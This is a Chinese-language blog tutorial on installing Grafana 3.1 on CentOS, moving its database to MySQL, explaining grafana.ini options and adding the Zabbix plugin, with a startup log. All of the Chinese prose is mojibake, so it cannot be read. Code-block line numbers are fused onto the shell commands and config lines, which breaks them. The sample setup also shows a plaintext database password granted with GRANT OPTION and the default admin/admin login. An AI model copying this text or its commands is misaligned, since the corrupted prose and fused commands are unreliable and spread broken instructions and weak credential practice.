https://grafanarel.s3.amazonaws.com/builds/grafana-3.1.0-1468321182.x86_64.rpm å¦‚æœè¢«å¢™ï¼Œå¯ä»¥åˆ°æˆ‘githubä¸Šé¢ä¸‹è½½ï¼šGrafana è¿™é‡Œéœ€è¦å®‰è£…ä¸‹ä¾èµ–åŒ…ï¼š 12$ sudo yum install initscripts fontconfig$ sudo rpm -Uvh grafana-3.1.0-1468321182.x86_64.rpm æˆ–è€…é€‰æ‹©YUMæ–¹å¼å®‰è£…ï¼š 1234567891011vim etc/yum.repos.d/grafana.repo[grafana]name=grafanabaseurl=https://packagecloud.io/grafana/stable/el/6/$basearchrepo_gpgcheck=1enabled=1gpgcheck=1gpgkey=https://packagecloud.io/gpg.key https://grafanarel.s3.amazonaws.com/RPM-GPG-KEY-grafanasslverify=1sslcacert=/etc/pki/tls/certs/ca-bundle.crt è¿˜æœ‰ï¼Œå¦‚æœä½ æƒ³æµ‹è¯•ç‰ˆæˆ–å‘å¸ƒå€™é€‰æµ‹è¯•å­˜å‚¨åº“ã€‚ 1baseurl=https://packagecloud.io/grafana/testing/el/6/$basearch ç„¶åé€šè¿‡å®‰è£…Grafana yumçš„å‘½ä»¤ã€‚ 1$ sudo yum install grafana RPM GPGå¯†é’¥RPMåŒ…è¿›è¡Œç­¾åï¼Œå¯ä»¥éªŒè¯è¿™ä¸ªç­¾åå…¬å…±GPGå¯†é’¥ã€‚ åŒ…è£…ç»†èŠ‚ å®‰è£…äºŒè¿›åˆ¶æ–‡ä»¶åˆ° /usr/sbin/grafana-server å‰¯æœ¬çš„init.dè„šæœ¬/etc/init.d/grafana-server é»˜è®¤çš„å®‰è£…æ–‡ä»¶ç¯å¢ƒï¼Œä»¥åœ¨/etc/sysconfig/grafana-server æ‹·è´é…ç½®æ–‡ä»¶/etc/grafana/grafana.ini å®‰è£…systemdæœåŠ¡ï¼ˆå¦‚æœsystemdå¯ç”¨ï¼‰åç§°grafana-server.service é»˜è®¤é…ç½®ä½¿ç”¨çš„æ—¥å¿—æ–‡ä»¶åœ¨/var/log/grafana/grafana.log é»˜è®¤é…ç½®æŒ‡å®šä»¥sqlite3çš„æ•°æ®åº“/var/lib/grafana/grafana.db å¯åŠ¨æœåŠ¡ï¼ˆçš„init.dæœåŠ¡ï¼‰ 1$ sudo service grafana-server start è¿™å°†å¯åŠ¨grafanaæœåŠ¡è¿›ç¨‹ä½œä¸ºgrafanaç”¨æˆ·ï¼Œè¿™æ˜¯åŒ…å®‰è£…è¿‡ç¨‹ä¸­åˆ›å»ºã€‚é»˜è®¤HTTPç«¯å£æ˜¯ 3000ï¼Œå’Œé»˜è®¤çš„ç”¨æˆ·å’Œç»„ç®¡ç†ã€‚ è¦é…ç½®æœåŠ¡å™¨Grafanaåœ¨å¯åŠ¨æ—¶å¯åŠ¨ï¼š 1sudo /sbin/chkconfig --add grafana-server centos 7 ç³»ç»Ÿå¯åŠ¨æœåŠ¡ï¼š 123$ systemctl daemon-reload$ systemctl start grafana-server$ systemctl status grafana-server centos 7 è®¾ç½®å¼€æœºå¯åŠ¨ 1sudo systemctl enable grafana-server.service ç¯å¢ƒæ–‡ä»¶è¯¥systemdæœåŠ¡æ–‡ä»¶å’Œè„šæœ¬çš„init.déƒ½ä½¿ç”¨ä½äºæ–‡ä»¶ åœ¨/etc/sysconfig/grafanaæœåŠ¡å¯åŠ¨åç«¯æ—¶æ‰€ä½¿ç”¨çš„ç¯å¢ƒå˜é‡ã€‚åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥è¦†ç›–æ—¥å¿—ç›®å½•ï¼Œæ•°æ®ç›®å½•å’Œå…¶ä»–å˜é‡ã€‚ è®°å½•é»˜è®¤æƒ…å†µä¸‹Grafanaå°†è®°å½•åˆ°çš„/var/log/grafana æ•°æ®åº“é»˜è®¤é…ç½®æŒ‡å®šä½äºä¸€ä¸ªsqlite3çš„æ•°æ®åº“ /var/lib/grafana/grafana.dbã€‚è¯·å¤‡ä»½å‡çº§ä¹‹å‰ï¼Œè¿™ä¸ªæ•°æ®åº“ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨MySQLæˆ–è€…Postgresä½œä¸ºGrafanaæ•°æ®åº“ä¸Šè¯¦è¿°é…ç½®é¡µé¢ã€‚ ç»„æ€è¯¥é…ç½®æ–‡ä»¶ä½äº/etc/grafana/grafana.ini.å»é…ç½®é¡µé¢ä¸Šçš„æ‰€æœ‰è¿™äº›é€‰é¡¹çš„è¯¦ç»†ä¿¡æ¯ã€‚ é…ç½®http://docs.grafana.org/installation/configuration/#database é…ç½®æ–‡ä»¶é‡Œåˆ†æ®µç»™å‡ºäº†éå¸¸è¯¦ç»†çš„è¯´æ˜ï¼Œéå¸¸äººæ€§åŒ– é»˜è®¤ä½¿ç”¨çš„æ˜¯sqlite3çš„ï¼Œè¿™é‡Œæˆ‘è°ƒæ•´ä¸ºè‡ªå·±MySQLçš„ã€‚ 1.åˆ›å»ºæ•°æ®åº“å’Œç”¨æˆ·12345678mysql&gt; CREATE DATABASE grafana DEFAULT CHARACTER SET utf8;Query OK, 1 row affected (0.02 sec)mysql&gt; GRANT ALL ON grafana.* TO grafana@'192.168.1.%' IDENTIFIED BY 'haozhuo.com' WITH GRANT OPTION;Query OK, 0 rows affected (0.26 sec)mysql&gt; FLUSH PRIVILEGES;Query OK, 0 rows affected (0.02 sec) 2.æŒ‡å®šæ•°æ®åº“åŠè®¤è¯ä¿¡æ¯cp /etc/grafana/grafana.ini{,.default}vim /etc/grafana/grafana.ini é…ç½®æ–‡ä»¶ï¼š 1234567891011121314151617[database]# Either \"mysql\", \"postgres\" or \"sqlite3\", it's your choicetype = mysqlhost = 192.168.1.201:3306name = grafanauser = grafanapassword = haozhuo.com[session]# Either \"memory\", \"file\", \"redis\", \"mysql\", \"postgres\", default is \"file\"provider = redisprovider_config = addr=127.0.0.1:6379,pool_size=100,db=grafana cookie_name = grafana_sesscookie_secure = false session_life_time = 86400 grafana.ini é…ç½®æ–‡ä»¶è¯¦è§£123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143app_modeï¼šåº”ç”¨åç§°ï¼Œé»˜è®¤æ˜¯production[path]dataï¼šä¸€ä¸ªgrafanaç”¨æ¥å­˜å‚¨sqlite3ã€ä¸´æ—¶æ–‡ä»¶ã€å›è¯çš„åœ°å€è·¯å¾„logsï¼šgrafanaå­˜å‚¨logsçš„è·¯å¾„[server]http_addrï¼šç›‘å¬çš„ipåœ°å€ï¼Œï¼Œé»˜è®¤æ˜¯0.0.0.0http_portï¼šç›‘å¬çš„ç«¯å£ï¼Œé»˜è®¤æ˜¯3000protocolï¼šhttpæˆ–è€…httpsï¼Œï¼Œé»˜è®¤æ˜¯httpdomainï¼šè¿™ä¸ªè®¾ç½®æ˜¯root_urlçš„ä¸€éƒ¨åˆ†ï¼Œå½“ä½ é€šè¿‡æµè§ˆå™¨è®¿é—®grafanaæ—¶çš„å…¬å¼€çš„domianåç§°ï¼Œé»˜è®¤æ˜¯localhostenforce_domainï¼šå¦‚æœä¸»æœºçš„headerä¸åŒ¹é…domianï¼Œåˆ™è·³è½¬åˆ°ä¸€ä¸ªæ­£ç¡®çš„domainä¸Šï¼Œé»˜è®¤æ˜¯falseroot_urlï¼šè¿™æ˜¯ä¸€ä¸ªwebä¸Šè®¿é—®grafanaçš„å…¨è·¯å¾„urlï¼Œé»˜è®¤æ˜¯%(protocol)s://%(domain)s:%(http_port)s/router_loggingï¼šæ˜¯å¦è®°å½•webè¯·æ±‚æ—¥å¿—ï¼Œé»˜è®¤æ˜¯falsecert_fileï¼šå¦‚æœä½¿ç”¨httpsåˆ™éœ€è¦è®¾ç½®cert_keyï¼šå¦‚æœä½¿ç”¨httpsåˆ™éœ€è¦è®¾ç½®[database]grafanaé»˜è®¤éœ€è¦ä½¿ç”¨æ•°æ®åº“å­˜å‚¨ç”¨æˆ·å’Œdashboardä¿¡æ¯ï¼Œé»˜è®¤ä½¿ç”¨sqlite3æ¥å­˜å‚¨ï¼Œä½ ä¹Ÿå¯ä»¥æ¢æˆå…¶ä»–æ•°æ®åº“typeï¼šå¯ä»¥æ˜¯mysqlã€postgresã€sqlite3ï¼Œé»˜è®¤æ˜¯sqlite3pathï¼šåªæ˜¯sqlite3éœ€è¦ï¼Œå®šä¹‰sqlite3çš„å­˜å‚¨è·¯å¾„hostï¼šåªæ˜¯mysqlã€postgreséœ€è¦ï¼Œé»˜è®¤æ˜¯127.0.0.1:3306nameï¼šgrafanaçš„æ•°æ®åº“åç§°ï¼Œé»˜è®¤æ˜¯grafanauserï¼šè¿æ¥æ•°æ®åº“çš„ç”¨æˆ·passwordï¼šæ•°æ®åº“ç”¨æˆ·çš„å¯†ç ssl_modeï¼šåªæ˜¯postgresä½¿ç”¨[security]admin_userï¼šgrafanaé»˜è®¤çš„adminç”¨æˆ·ï¼Œé»˜è®¤æ˜¯adminadmin_passwordï¼šgrafana adminçš„é»˜è®¤å¯†ç ï¼Œé»˜è®¤æ˜¯adminlogin_remember_daysï¼šå¤šå°‘å¤©å†…ä¿æŒç™»å½•çŠ¶æ€secret_keyï¼šä¿æŒç™»å½•çŠ¶æ€çš„ç­¾ådisable_gravatarï¼š[users]allow_sign_upï¼šæ˜¯å¦å…è®¸æ™®é€šç”¨æˆ·ç™»å½•ï¼Œå¦‚æœè®¾ç½®ä¸ºfalseï¼Œåˆ™ç¦æ­¢ç”¨æˆ·ç™»å½•ï¼Œé»˜è®¤æ˜¯trueï¼Œåˆ™adminå¯ä»¥åˆ›å»ºç”¨æˆ·ï¼Œå¹¶ç™»å½•grafanaallow_org_createï¼šå¦‚æœè®¾ç½®ä¸ºfalseï¼Œåˆ™ç¦æ­¢ç”¨æˆ·åˆ›å»ºæ–°ç»„ç»‡ï¼Œé»˜è®¤æ˜¯trueauto_assign_orgï¼šå½“è®¾ç½®ä¸ºtrueçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨çš„æŠŠæ–°å¢ç”¨æˆ·å¢åŠ åˆ°idä¸º1çš„ç»„ç»‡ä¸­ï¼Œå½“è®¾ç½®ä¸ºfalseçš„æ—¶å€™ï¼Œæ–°å»ºç”¨æˆ·çš„æ—¶å€™ä¼šæ–°å¢ä¸€ä¸ªç»„ç»‡auto_assign_org_roleï¼šæ–°å»ºç”¨æˆ·é™„åŠ çš„è§„åˆ™ï¼Œé»˜è®¤æ˜¯Viewerï¼Œè¿˜å¯ä»¥æ˜¯Adminã€Editor[auth.anonymous]enabledï¼šè®¾ç½®ä¸ºtrueï¼Œåˆ™å¼€å¯å…è®¸åŒ¿åè®¿é—®ï¼Œé»˜è®¤æ˜¯falseorg_nameï¼šä¸ºåŒ¿åç”¨æˆ·è®¾ç½®ç»„ç»‡åç§°org_roleï¼šä¸ºåŒ¿åç”¨æˆ·è®¾ç½®çš„è®¿é—®è§„åˆ™ï¼Œé»˜è®¤æ˜¯Viewer[auth.github]é’ˆå¯¹githubé¡¹ç›®çš„ï¼Œå¾ˆæ˜æ˜¾ï¼Œå‘µå‘µenabled = falseallow_sign_up = falseclient_id = some_idclient_secret = some_secretscopes = user:emailauth_url = https://github.com/login/oauth/authorizetoken_url = https://github.com/login/oauth/access_tokenapi_url = https://api.github.com/userteam_ids =allowed_domains =allowed_organizations =[auth.google]é’ˆå¯¹google appçš„ï¼Œå‘µå‘µenabled = falseallow_sign_up = falseclient_id = some_client_idclient_secret = some_client_secretscopes = https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.emailauth_url = https://accounts.google.com/o/oauth2/authtoken_url = https://accounts.google.com/o/oauth2/tokenapi_url = https://www.googleapis.com/oauth2/v1/userinfoallowed_domains =[auth.basic]enabledï¼šå½“è®¾ç½®ä¸ºtrueï¼Œåˆ™http apiå¼€å¯åŸºæœ¬è®¤è¯[auth.ldap]enabledï¼šè®¾ç½®ä¸ºtrueåˆ™å¼€å¯LDAPè®¤è¯ï¼Œé»˜è®¤æ˜¯falseconfig_fileï¼šå¦‚æœå¼€å¯LDAPï¼ŒæŒ‡å®šLDAPçš„é…ç½®æ–‡ä»¶/etc/grafana/ldap.toml[auth.proxy]å…è®¸ä½ åœ¨ä¸€ä¸ªHTTPåå‘ä»£ç†ä¸Šè¿›è¡Œè®¤è¯è®¾ç½®enabledï¼šé»˜è®¤æ˜¯falseheader_nameï¼šé»˜è®¤æ˜¯X-WEBAUTH-USERheader_propertyï¼šé»˜è®¤æ˜¯ä¸ªåç§°usernameauto_sign_upï¼šé»˜è®¤æ˜¯trueã€‚å¼€å¯è‡ªåŠ¨æ³¨å†Œï¼Œå¦‚æœç”¨æˆ·åœ¨grafana DBä¸­ä¸å­˜åœ¨[analytics]reporting_enabledï¼šå¦‚æœè®¾ç½®ä¸ºtrueï¼Œåˆ™ä¼šå‘é€åŒ¿åä½¿ç”¨åˆ†æåˆ°stats.grafana.orgï¼Œä¸»è¦ç”¨äºè·Ÿè¸ªå…è®¸å®ä¾‹ã€ç‰ˆæœ¬ã€dashboardã€é”™è¯¯ç»Ÿè®¡ã€‚é»˜è®¤æ˜¯truegoogle_analytics_ua_idï¼šä½¿ç”¨GAè¿›è¡Œåˆ†æï¼Œå¡«å†™ä½ çš„GA IDå³å¯[dashboards.json]å¦‚æœä½ æœ‰ä¸€ä¸ªç³»ç»Ÿè‡ªåŠ¨äº§ç”Ÿjsonæ ¼å¼çš„dashboardï¼Œåˆ™å¯ä»¥å¼€å¯è¿™ä¸ªç‰¹æ€§è¯•è¯•enabledï¼šé»˜è®¤æ˜¯falsepathï¼šä¸€ä¸ªå…¨è·¯å¾„ç”¨æ¥åŒ…å«ä½ çš„json dashboardï¼Œé»˜è®¤æ˜¯/var/lib/grafana/dashboards[session]providerï¼šé»˜è®¤æ˜¯fileï¼Œå€¼è¿˜å¯ä»¥æ˜¯memoryã€mysqlã€postgresprovider_configï¼šè¿™ä¸ªå€¼çš„é…ç½®ç”±providerçš„è®¾ç½®æ¥ç¡®å®šï¼Œå¦‚æœprovideræ˜¯fileï¼Œåˆ™æ˜¯data/xxxxè·¯å¾„ç±»å‹ï¼Œå¦‚æœprovideræ˜¯mysqlï¼Œåˆ™æ˜¯user:password@tcp(127.0.0.1:3306)/database_nameï¼Œå¦‚æœprovideræ˜¯postgresï¼Œåˆ™æ˜¯user=a password=b host=localhost port=5432 dbname=c sslmode=disablecookie_nameï¼šgrafanaçš„cookieåç§°cookie_secureï¼šå¦‚æœè®¾ç½®ä¸ºtrueï¼Œåˆ™grafanaä¾èµ–httpsï¼Œé»˜è®¤æ˜¯falsesession_life_timeï¼šsessionè¿‡æœŸæ—¶é—´ï¼Œé»˜è®¤æ˜¯86400ç§’ï¼Œ24å°æ—¶ä»¥ä¸‹æ˜¯å®˜æ–¹æ–‡æ¡£æ²¡æœ‰ï¼Œé…ç½®æ–‡ä»¶ä¸­æœ‰çš„[smtp]enabled = falsehost = localhost:25user =password =cert_file =key_file =skip_verify = falsefrom_address = admin@grafana.localhost[emails]welcome_email_on_sign_up = falsetemplates_pattern = emails/*.html[log]modeï¼šå¯ä»¥æ˜¯consoleã€fileï¼Œé»˜è®¤æ˜¯consoleã€fileï¼Œä¹Ÿå¯ä»¥è®¾ç½®å¤šä¸ªï¼Œç”¨é€—å·éš”å¼€buffer_lenï¼šchannelçš„bufferé•¿åº¦ï¼Œé»˜è®¤æ˜¯10000levelï¼šå¯ä»¥æ˜¯\"Trace\", \"Debug\", \"Info\", \"Warn\", \"Error\", \"Critical\"ï¼Œé»˜è®¤æ˜¯info[log.console]levelï¼šè®¾ç½®çº§åˆ«[log.file]levelï¼šè®¾ç½®çº§åˆ«log_rotateï¼šæ˜¯å¦å¼€å¯è‡ªåŠ¨è½®è½¬max_linesï¼šå•ä¸ªæ—¥å¿—æ–‡ä»¶çš„æœ€å¤§è¡Œæ•°ï¼Œé»˜è®¤æ˜¯1000000max_lines_shiftï¼šå•ä¸ªæ—¥å¿—æ–‡ä»¶çš„æœ€å¤§å¤§å°ï¼Œé»˜è®¤æ˜¯28ï¼Œè¡¨ç¤º256MBdaily_rotateï¼šæ¯å¤©æ˜¯å¦è¿›è¡Œæ—¥å¿—è½®è½¬ï¼Œé»˜è®¤æ˜¯truemax_daysï¼šæ—¥å¿—è¿‡æœŸæ—¶é—´ï¼Œé»˜è®¤æ˜¯7,7å¤©ååˆ é™¤ 3.é‡å¯grafanaservice grafana-server restarttail -f /var/log/grafana/grafana.log 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061[root@LAN_zabbix ~]# tail -f /var/log/grafana/grafana.logt=2016-07-14T00:49:01+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table dashboard to dashboard_v1 - v1\"t=2016-07-14T00:49:01+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_dashboard_org_id - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_org_id_slug - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy dashboard v1 to v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop table dashboard_v1\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"alter dashboard.data to mediumtext v1\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column updated_by in dashboard - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column created_by in dashboard - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column gnetId in dashboard\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add index for gnetId in dashboard\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create data_source table\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index data_source.account_id\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add unique index data_source.account_id_name\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index IDX_data_source_account_id - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_data_source_account_id_name - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table data_source to data_source_v1 - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create data_source table v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_data_source_org_id - v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_data_source_org_id_name - v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy data_source v1 to v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table data_source_v1 #2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column with_credentials\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create api_key table\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.account_id\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.key\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.account_id_name\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index IDX_api_key_account_id - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_api_key_key - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_api_key_account_id_name - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table api_key to api_key_v1 - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create api_key table v2\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_api_key_org_id - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_api_key_key - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_api_key_org_id_name - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy api_key v1 to v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table api_key_v1\"t=2016-07-14T00:49:06+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard_snapshot table v4\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop table dashboard_snapshot_v4 #1\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard_snapshot table v5 #2\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_snapshot_key - v5\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_snapshot_delete_key - v5\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_dashboard_snapshot_user_id - v5\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"alter dashboard_snapshot to mediumtext v2\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create quota table v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_quota_org_id_user_id_target - v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create plugin_setting table\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_plugin_setting_org_id_plugin_id - v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create session table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table playlist table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table playlist_item table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create playlist table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create playlist item table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop preferences table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop preferences table v3\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create preferences table v3\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Created default admin user: [admin]\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Starting plugin search\" logger=pluginst=2016-07-14T00:49:20+0800 lvl=eror msg=\"Plugins: Failed to load plugin json file: [/usr/share/grafana/public/app/plugins/datasource/zabbix/plugin.json invalid character '\\\"' after object key:value pair], err: %!v(MISSING)\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Server Listening\" logger=server address=0.0.0.0:3000 protocol=http subUrl= logger=server address=0.0.0.0:3000 protocol=http Dashboardweb: http://192.168.1.220:3000 é»˜è®¤ç”¨æˆ·å:admin é»˜è®¤ç”¨æˆ·åå¯†ç :admin ç™»å½•åä¸€ç‰‡ç©ºç™½ï¼Œæ‰€ä»¥éœ€è¦å®‰è£…ç›¸åº”æ’ä»¶ã€‚ grafana-zabbixæ’ä»¶12345https://github.com/alexanderzobnin/grafana-zabbixhttp://play.grafana-zabbix.org/http://docs.grafana-zabbix.org/installation/http://docs.grafana-zabbix.org/installation/configuration/https://grafana.net/plugins/alexanderzobnin-zabbix-app/installation 1.å®‰è£…æ’ä»¶ å®˜ç½‘è®²çš„éå¸¸è¯¦ç»†å‚è€ƒé“¾æ¥ï¼šhttp://docs.grafana-zabbix.org/installation/ 12345678[root@LAN_zabbix ~]# grafana-cli plugins install alexanderzobnin-zabbix-appinstalling alexanderzobnin-zabbix-app @ 3.0.0from url: https://grafana.net/api/plugins/alexanderzobnin-zabbix-app/versions/3.0.0/downloadinto: /var/lib/grafana/pluginsâœ” Installed alexanderzobnin-zabbix-app successfullyRestart grafana after installing plugins . &lt;service grafana-server restart&gt; ç„¶ååœ¨ç™»é™†æŸ¥çœ‹ï¼Œè¿™é‡Œå·²ç»å®‰è£…ä¸Šzabbixæ’ä»¶äº†ã€‚ ä¸‰ã€grafanaä½¿ç”¨grafanaçš„ä»ªè¡¨å’Œzabbixçš„ç›‘æ§å·®ä¸å¤šï¼ŒåŸºæœ¬æ˜¯å…ˆåˆ›å»ºç›‘æ§æ¨¡æ¿ã€ç›‘æ§é¡¹ï¼Œç„¶åå†æ·»åŠ ä»ªè¡¨ã€‚è¿™é‡Œå…ˆå»ºç«‹æ•°æ®æºï¼Œå†åˆ›å»ºä»ªè¡¨å¯¹è±¡ï¼Œå¹¶æ·»åŠ æ¨¡æ¿ï¼Œæœ€åæ·»åŠ ä»ªè¡¨ã€‚ å¯å‚è€ƒï¼šhttps://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage ç»„æ€å¯ç”¨æ’ä»¶ è½¬åˆ°Grafanaä¾§é¢æ¿æ’ä»¶ï¼Œé€‰æ‹©åº”ç”¨ç¨‹åºé€‰é¡¹å¡ï¼Œç„¶åé€‰æ‹©çš„zabbixï¼Œæ‰“å¼€é…ç½® é€‰é¡¹å¡å¹¶å¯ç”¨æ’ä»¶ã€‚ 1.é…ç½®zabbixæ•°æ®æº å¯ç”¨æ’ä»¶åå¯ä»¥æ·»åŠ çš„zabbixæ•°æ®æºã€‚ è¦æ·»åŠ æ–°çš„zabbixæ•°æ®æºå…¬å¼€æ•°æ®æºåœ¨ä¾§é¢æ¿ä¸­ï¼Œå•å‡»æ·»åŠ æ•°æ®æºï¼Œå¹¶é€‰æ‹©çš„zabbixä»ä¸‹æ‹‰åˆ—è¡¨ä¸­ã€‚ http://192.168.1.220/zabbix/api_jsonrpc.php æ³¨æ„: api_jsonrpc.phpæ˜¯zabbixçš„APIè°ƒç”¨æ¥å£ HTTPè®¾ç½® ç½‘å€ï¼šè®¾ç½®çš„zabbix API URLï¼ˆå®Œæ•´è·¯å¾„api_jsonrpc.phpï¼‰ã€‚ è®¿é—®ï¼š ä»£ç†ï¼šé€šè¿‡Grafanaåç«¯è®¿é—® ç›´æ¥ï¼šä»æµè§ˆå™¨è®¿é—®ã€‚ HTTPè®¤è¯ï¼šé…ç½®å¦‚æœä½¿ç”¨ä»£ç†éªŒè¯ã€‚ åŸºæœ¬è®¤è¯ï¼š å‡­æ®ï¼šä»£ç†è®¿é—®æ„å‘³ç€Grafanaåç«¯å°†ä»£ç†ä»æµè§ˆå™¨çš„æ‰€æœ‰è¯·æ±‚ï¼Œå¹¶é€ä»–ä»¬åˆ°æ•°æ®æºã€‚è¿™æ˜¯æœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒå¯ä»¥æ¶ˆé™¤CORSï¼ˆè·¨äº§åœ°ç«™ç‚¹èµ„æºï¼‰çš„é—®é¢˜ï¼Œä»¥åŠæ¶ˆé™¤éœ€è¦â€‹â€‹å®£ä¼ è®¤è¯ç»†èŠ‚æ•°æ®æºåˆ°æµè§ˆå™¨ã€‚ ç›´æ¥è®¿é—®ä»ç„¶æ”¯æŒï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½æ˜¯æœ‰ç”¨çš„ç›´æ¥è®¿é—®æ•°æ®æºå–å†³äºGrafanaï¼Œç”¨æˆ·ï¼Œå’Œæ•°æ®æºçš„ä½¿ç”¨æƒ…å†µå’Œæ‹“æ‰‘ã€‚ ZABBIX APIç»†èŠ‚ ç”¨æˆ·å’Œå¯†ç ï¼šè®¾ç½®ç™»å½•è®¿é—®çš„zabbix APIã€‚åŒæ—¶æ£€æŸ¥ç”¨æˆ·çš„æƒé™çš„zabbixå¦‚æœä½ ä¸èƒ½å¾—åˆ°ä»»ä½•ç»„å’Œä¸»æœºçš„Grafanaã€‚ è¶‹åŠ¿ï¼šå¯ç”¨å¦‚æœæ‚¨ä½¿ç”¨çš„zabbix 3.xæˆ–è¡¥ä¸ä¸­çš„zabbix 2.xçš„è¶‹åŠ¿æ”¯æ’‘ï¼ˆZBXNEXT-1193ï¼‰ã€‚æ­¤é€‰é¡¹ä¸¥æ ¼æ¨èç”¨äºæ˜¾ç¤ºæ—¶é—´é•¿å‘¨æœŸï¼ˆè¶…è¿‡å‡ å¤©ï¼Œåœ¨ä¸åŒçš„zabbixæ‚¨çš„é¡¹ç›®çš„æ›´æ–°é—´éš”çš„ï¼‰ï¼Œå› ä¸ºé¡¹ç›®å†å²å‡ å¤©åŒ…å«å¨çš„ç‚¹ã€‚ä½¿ç”¨è¶‹åŠ¿å°†å¢åŠ Grafanaæ€§èƒ½ã€‚ 